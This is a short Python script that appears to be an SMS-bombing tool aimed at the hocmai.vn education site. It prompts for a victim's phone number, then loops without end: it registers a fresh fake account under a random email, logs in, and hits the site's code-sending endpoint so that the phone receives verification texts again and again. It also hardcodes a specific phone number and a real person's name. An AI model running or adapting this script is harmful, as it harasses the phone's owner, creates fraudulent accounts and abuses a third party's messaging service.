#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import random

def genEmail(): 
	email = ""
	char = "zxcvbnmlopkiujhytgfredswqa147852369"
	while len(email) < 10:
		i = random.randrange(len(char))
		email = email + char[i]
	email = email + "@gmail.com"
	return(email)

def register(email,phone): #phone = 0943687522
	global s
	urlRegister = "https://hocmai.vn/loginv2/register.php"
	data = {
		"name" : "ngo bao chau",
		"password" : "ThisIsMyPasswd@123",
		"email" : "",
		"phone" : "0943687522"
		}
	data["email"] = email
	data["phone"] = phone
	s = requests.Session()
	res = s.post(urlRegister, data = data)
	return(s,res,res.text)

def login(email):
	link = "https://hocmai.vn/loginv2/index.php"
	files = {
		"username" : (None,"email"),
		"password" : (None, "ThisIsMyPasswd@123")
			}
	user = list(files["username"])
	user[0] = email
	files["username"] = tuple(user)
	res = s.post(link, files = files)
	return(res)

def hocmai(phone): #phone = 0943687522
	link = "https://hocmai.vn/user/profile/getcode.php"
	data = {"phone" : "","action" : "add"}
	data["phone"] = phone
	res = s.post(link, data = data)
	return(res,res.text)

phone = input(">_ Phone : ")
count = 0
while True:
	email = genEmail()
	register(email,phone)
	login(email)
	count = count + 1
	print(count,hocmai(phone))
	
